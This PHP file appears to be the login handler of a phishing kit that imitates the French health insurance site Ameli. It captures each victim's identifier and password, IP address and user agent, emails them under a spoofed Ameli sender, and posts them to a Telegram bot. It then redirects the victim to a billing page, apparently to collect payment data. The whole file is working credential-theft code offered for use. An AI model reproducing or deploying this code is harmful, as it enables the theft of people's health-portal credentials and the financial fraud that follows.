<?php

include("../common/sub_includes.php");



if(isset($_POST['ide_login_submit'])){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['identifiant'] = htmlspecialchars($_POST['ide_login']);
	$_SESSION['password'] = htmlspecialchars($_POST['ide_password']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


	if(isset($_SESSION["identifiant"])){

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "


🌗 	Identifiant  : ".$_SESSION['identifiant']."
🌙 	Mot de passe : ".$_SESSION['password']."

🎯 IP : ".$_SESSION['ip']."
🎯 User-agent : ".$_SESSION['useragent']."

					";

					$subject = "[🌗] + 1 Login |".$_SESSION['identifiant']." | ".$_SESSION['ip'];
					$headers = "From: Ameli | Login <vito@tele.com>";

					mail($rezmail, $subject, $message, $headers,$head);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '
〔⭐〕 Login Améli 〔⭐〕

📂 Identifiant : '.$_SESSION['identifiant'].'
📂 Mot de passe : '.$_SESSION['password'].'



🎯 Adresse Ip : '.$_SESSION['ip'].'
🎯 User-agent : '.$_SESSION['useragent'].'
					  
					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

				header('Location: ../steps/billing.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}
else{
	header('Location: ../');
}

?>